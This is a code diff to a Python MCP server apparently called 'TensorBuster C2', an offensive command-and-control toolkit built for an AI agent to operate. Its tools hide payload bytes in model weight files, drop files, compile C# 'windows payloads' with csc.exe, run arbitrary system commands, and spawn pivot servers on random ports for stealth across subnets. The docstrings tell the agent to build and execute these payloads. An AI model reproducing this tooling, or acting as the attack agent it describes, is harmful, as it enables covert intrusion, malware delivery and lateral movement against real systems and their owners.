@@ -3,6 +3,7 @@ import os
 import struct
 import subprocess
 import threading
+import random
 
 import torch.nn as nn
 import torch.optim as optim
@@ -329,14 +330,28 @@ def export_encoded(t: torch.Tensor, filename: str) -> Image.Image:
 @MCP_SERVER.tool()
 def import_image(filename: str) -> torch.Tensor:
     """
-    Opens a PIL image and converts it to a floating-point torch.Tensor
+    Opens a PIL image and converts it to a floating-point torch.Tensor.
+
+    Args:
+        filename (str): Name of image file to open
+
+    Returns:
+        torch.Tensor: A tensor object to which the image was converted.
     """
     return F.to_tensor(Image.open(filename))
 
 @MCP_SERVER.tool()
-def payload_enc(legitimate_state_dict_file: torch.Tensor, num_lsb: int, payload_bytes_to_hide: torch.Tensor) -> list[torch.Tensor]:
+def payload_enc(legitimate_state_dict_file: str, num_lsb: int, payload_bytes_to_hide: bytearray) -> torch.Tensor:
     """
-    Encodes an entire payload (`payload_bytes_to_hide`) inside `num_lsb` mantissa bits of a supplied `legitimate_state_dict_file`.
+    Encodes an entire payload inside a given number of mantissa bits of a supplied model file.
+
+    Args:
+        legitimate_state_dict_file (str): name of file to hide payload inside
+        num_lsb (int): number of LSBs needed to hide the payload
+        payload_bytes_to_hide(bytearray): an array of bytes containing the payload to encode
+
+    Returns:
+        torch.Tensor: A Tensor wrapping the payload bytes inside mantissa bits
     """
     if not os.path.exists(legitimate_state_dict_file):
         raise FileNotFoundError(
@@ -392,6 +407,12 @@ def payload_enc(legitimate_state_dict_file: torch.Tensor, num_lsb: int, payload_
 def load_file(absolute_path: str) -> str:
     """
     Reads the content of a file from the local filesystem on the machine on which you are deployed.
+
+    Args:
+        absolute_path (str): the full path of the file to read
+
+    Returns:
+        str: The contents of the file that was read
     """
     try:
         with open(absolute_path, 'r', encoding='utf-8') as f:
@@ -403,6 +424,13 @@ def load_file(absolute_path: str) -> str:
 def drop_file(absolute_path: str, contents: str):
     """
     Writes a file to the local filesystem on the machine on which you are deployed.
+
+    Args:
+        absolute_path (str): the full path of the file to drop
+        contents (str): the data to save at the full path in question
+
+    Returns:
+        None: drops a file to the file system instead.
     """
     try:
         with open(absolute_path, 'r', encoding='utf-8') as f:
@@ -413,7 +441,16 @@ def drop_file(absolute_path: str, contents: str):
 @MCP_SERVER.tool()
 def build_windows_payload(code: str, compiler_dir: str, source_path: str, exe_path: str):
     """
-    Compiles a C# code snippet that you may have generated on the machine on which you are deployed using csc.exe.
+    Uses csc.exe to compile a C# code snippet that you may have generated on the machine on which you are deployed.
+    
+    Args:
+        code (str): The generated code snippet.
+        compiler_dir (str): The Windows directory on the target in which the compiler is located. By default, this is C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319 on Windows 11/Server 2025, but it may be different.
+        source_path (str): Path to file to save the code snippet to.
+        exe_path (str): Path to the resulting binary.
+
+    Returns:
+        None: outputs a command that you are to use the `run_system_command()` tool to execute.
     """
     try:
         drop_file(source_path, code)
@@ -422,14 +459,20 @@ def build_windows_payload(code: str, compiler_dir: str, source_path: str, exe_pa
         print(f"Error: {str(e)}")
 
 @MCP_SERVER.tool()
-def run_system_command(args: list[str]) -> str:
+def run_system_command(cli_args: list[str]) -> str:
     """
     Runs a system command on the machine on which you are deployed and returns the output of the command in question.
+    
+    Args:
+        cli_args (list[str]): An array list of parameters that this tool passes to `subprocess.run()` to execute the command.
+
+    Returns:
+        str: The output of the command that was executed.
     """
     try:
         # Use subprocess.run with list args for OPSEC
         result = subprocess.run(
-            args,
+            cli_args,
             capture_output=True,
             text=True,
             check=True
@@ -451,11 +494,11 @@ def update_session_with_response(session_id: str, response_content: str, context
     This integrates agent responses into the persistent context for future prompt building.
     
     Args:
-        session_id: The session ID to update
-        response_content: The agent's response/output to store
+        session_id (str): The session ID to update
+        response_content (str): The agent's response/output to store
         
     Returns:
-        Confirmation that the response was stored
+        str: Confirmation that the response was stored
     """
     if context_manager is not None:
         context_manager.add_agent_response(session_id, response_content)
@@ -463,9 +506,18 @@ def update_session_with_response(session_id: str, response_content: str, context
     return "Error: Context manager not available"
 
 @MCP_SERVER.tool()
-def mcp_pivot(listener_ip: str, listener_port: int, ctx: ClientContext = CurrentContext(), server: FastMCP = CurrentFastMCP()) -> FastMCP:
+def mcp_pivot(listener_ip: str, listener_port: int = random.randint(30000, 65535), ctx: ClientContext = CurrentContext(), server: FastMCP = CurrentFastMCP()) -> FastMCP:
     """
     Allows connected clients to spin up their own copies of this MCP server and serve it to more clients on different subnets.
+
+    Args:
+        listener_ip (str): Pivot IP address (use the `run_system_command` tool to execute either `ifconfig` if you're on Linux/macOS or `ipconfig` if you're on Windows to obtain this)
+        listener_port (int): Port on which to spawn the pivot (default is a random integer between 30000 and 65535 to remain as stealth as possible)
+        ctx (fastmcp.Context): Context in which MCP is running
+        server (fastmcp.FastMCP): Parent MCP server
+
+    Returns:
+        fastmcp.FastMCP: New MCP server instance containing all instructions, middleware, prompts, resources, resource templates, and tools copied over from parent server
     """
 
     pivot_mcp = FastMCP(f"TensorBuster C2 Pivot (Session ID: {ctx.session_id})")
@@ -503,6 +555,10 @@ def mcp_pivot(listener_ip: str, listener_port: int, ctx: ClientContext = Current
 
 @MCP_SERVER.prompt()
 def system_prompt(ip: int, port: int, tokenizer: AutoTokenizer, model_path: str, server: FastMCP = CurrentFastMCP()):
+    """
+    Default system prompt for the agent.
+    """
+    
     tools_desc = "\n    ".join([
         f"* {tool.name}: {tool.fn.__doc__}" 
         for tool in server.tools
